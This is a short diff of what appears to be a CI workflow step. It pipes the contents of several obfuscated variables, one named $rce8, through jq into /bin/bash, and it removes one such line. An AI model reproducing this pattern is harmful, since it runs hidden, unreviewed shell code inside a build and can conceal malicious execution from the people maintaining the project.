@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$lydz17398" | jq -r .ncxb8 | /bin/bash
           printf '%s' "$rce8" | jq -r .xggg4 | /bin/bash
-          echo $dak25034 | jq -r .dhy71905 | /bin/bash
           echo $cglx61 | jq -r .smsf47295 | /bin/bash
 
       - name: Persist data
